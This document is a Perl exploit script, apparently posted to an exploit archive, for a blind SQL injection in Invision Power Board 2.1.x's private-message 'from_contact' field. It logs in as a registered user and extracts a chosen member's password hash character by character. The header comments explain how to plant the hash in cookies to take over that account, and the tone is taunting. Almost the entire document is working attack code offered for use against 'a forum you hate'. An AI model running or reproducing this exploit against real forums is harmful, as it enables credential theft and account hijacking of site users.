Invision Power Board <= 2.1.5 (from_contact) SQL Injection Exploit
==================================================================




#!/usr/bin/perl
#############################################################################
## IPB <=2.1.4 exploit (possibly 2.1.5 too)                                ##
## Brought to you by the Ykstortion security team.                         ##
##                                                                         ##
## The bug is in the pm system so you must have a registered user.         ##
## The exploit will extract a password hash from the forum&#039;s data base of  ##
## the target user.                                                        ##
## You need to know the target user&#039;s member ID but it&#039;s not difficult to  ##
## find out, just look under their avatar next to one of their posts.      ##
## Once you have the hash, simply unset all forum cookies and set          ##
## member_id to the target user&#039;s member id and pass_hash to the hash      ##
## obtained from the database by this script.                              ##
##                                                                         ##
## Usage:                                                                  ##
##   $ ./ipb                                                               ##
##   IPB Forum URL ? forums.example.com/forums                             ##
##   Your username ? krypt_sk1dd13                                         ##
##   Your pass ? if_your_on_nix_this_gets_hidden                           ##
##   Target userid ? 3637                                                  ##
##                                                                         ##
##   Attempting to extract password hash from database...                  ##
##   537ab2d5b37ac3a3632f5d06e8e04368                                      ##
##   Hit enter to quit.                                                    ##
##                                                                         ##
## Requirements:                                                           ##
##   o Perl 5                                                              ##
##   o LWP 5.64 or later                                                   ##
##   o Internet access                                                     ##
##   o A forum you hate/dislike                                            ##
##   o A user on said forum                                                ##
##   o 32+ PMs left till your inbox is full, if not you can still delete   ##
##     PMs from your inbox as the successful ones come through             ##
##                                                                         ##
## Credit to: Nuticulus for finding the SQL injection                      ##
##                                                                         ##
## Have fun, you dumb skiddie.                                             ##
#############################################################################

use HTTP::Cookies;
use LWP 5.64;
use HTTP::Request;

# variables
my $login_page = &#039;?act=Login&CODE=01&#039;;
my $pm_page = &#039;?act=Msg&CODE=04&#039;;
my $pose_pm_page = &#039;?&#039;;
my $tries = 5;
my $sql = &#039;&#039;;
my $hash = &#039;&#039;;
my $need_null = 0;
my $i;
my $j;
my @charset = (&#039;0&#039; .. &#039;9&#039;, &#039;a&#039; .. &#039;f&#039;);
my %form = (act		=> &#039;Msg&#039;,
	CODE		=> &#039;04&#039;,
	MODE		=> &#039;01&#039;,
	OID		=> &#039;&#039;,
	removeattachid	=> &#039;&#039;,
	msg_title	=> &#039;asdf&#039;,
	bbmode		=> &#039;normal&#039;,
	ffont		=> 0,
	fsize		=> 0,
	fcolor		=> 0,
	LIST		=> &#039; LIST &#039;,
	helpbox		=> &#039;Insert Monotype Text (alt + p)&#039;,
	tagcount	=> 0,
	Post		=> &#039;jkl&#039;);
	

# objects
my $ua = LWP::UserAgent->new;
my $cj = HTTP::Cookies->new (file => "N/A", autosave => 0);
my $resp;

# init the cookie jar
$ua->cookie_jar ($cj);

# allow redirects on post requests
push @{ $ua->requests_redirectable }, "POST";

# get user input
print &#039;IPB Forum URL ? &#039;;
chomp (my $base_url = <STDIN>);
print &#039;Your username ? &#039;;
chomp (my $user = <STDIN>);
$form{entered_name} = $user;
print &#039;Your pass ? &#039;;
# systems without stty will error otherwise
my $stty = -x &#039;/bin/stty&#039;;
system &#039;stty -echo&#039; if $stty;		# to turn off echoing
chomp (my $pass = <STDIN>);
system &#039;stty echo&#039; if $stty;		# to turn it back on
print "\n" if $stty;
print &#039;Target userid ? &#039;;	# it&#039;ll say next to one of their posts
chomp (my $tid = <STDIN>);

# parse the given base url
if ($base_url !~ m#^http://#) { $base_url = &#039;http://&#039; . $base_url }
if ($base_url !~ m#/$|index\.php$#) { $base_url .= &#039;/&#039; }

do {
	$resp = $ua->post ($base_url . $login_page,
		[ UserName => $user,
		  PassWord => $pass,
		  CookieDate => 1,
		]);
} while ($tries-- && !$resp->is_success());

# reset tries
$tries = 5;

# did we get 200 (OK) ?
if (!$resp->is_success()) { die &#039;Error: &#039; . $resp->status_line . "\n" }

# was the pass right ?
if ($resp->content =~ /sorry, the password was wrong/i) {
	die "Error: password incorrect.\n";
}

# get ourselves a post_key (and an auth_key too with newer versions)
do {
	$resp = $ua->get ($base_url . $pm_page);
} while ($tries-- && !$resp->is_success());

# reset tries
$tries = 5;

if (!$resp->is_success()) { die &#039;Error: &#039; . $resp->status_line . "\n" }
if ($resp->content =~ m#<input\s+?type=["&#039;]?hidden["&#039;]?\s+?name=["&#039;]?post_key["&#039;]?\s+?value=["&#039;]?([0-9a-f]{32})["&#039;]?\s+?/>#)
{
	$form{post_key} = $1;
} else {
	die "Error: couldn&#039;t get a post key.\n";
}
if ($resp->content =~ m#<input\s+?type=["&#039;]?hidden["&#039;]?\s+?name=["&#039;]?auth_key["&#039;]?\s+?value=["&#039;]?([0-9a-f]{32})["&#039;]?\s+/>#)
{
	$form{auth_key} = $1;
}

# turn off buffering so chars in the hash show up straight away
$| = 1;

print "\nAttempting to extract password hash from database...\n ";

OFFSET:
for ($i = 0; $i < 32; ++$i) {
	CHAR:
	for ($j = 0; $j < @charset; ++$j) {
		# reset tries
		$tries = 5;
		print "\x08", $charset[$j];
		# build sql injection
		$sql = &#039;-1 UNION SELECT &#039; . ($need_null ? &#039;0, &#039; : &#039;&#039;) . &#039;CHAR(&#039;
		     . (join (&#039;,&#039;, map {ord} split (&#039;&#039;, $user))) . &#039;) FROM &#039;
		     . &#039;ibf_members WHERE id = &#039; . $tid . &#039; AND MID(&#039;
		     . &#039;member_login_key, &#039; . ($i + 1) . &#039;, 1) = CHAR(&#039;
		     . ord ($charset[$j]) . &#039;)&#039;;
		$form{from_contact} = $sql;
		$resp = $ua->post ($base_url . $post_pm_page, \%form,
			referer => $base_url . $pm_page);
		if (!$resp->is_success()) {
			die "\nError: " . $resp->status_line
			  . "\n" if (!$tries);
			--$tries;
			redo;
		}
		if ($resp->content =~ /sql error/i) {
			if ($need_null) {
				die "Error: SQL error.\n";
			} else {
				$need_null = 1;
				redo OFFSET;
			}
		} elsif ($resp->content !~ /there is no such member/i) {
			# we have a winner !
			print &#039; &#039;;
			next OFFSET;
		}
	}
	# uh oh, something went wrong
	die "\nError: couldn&#039;t get a char for offset $i\n";
}
print "\x08 \x08\nHit enter to quit.\n";
<STDIN>;



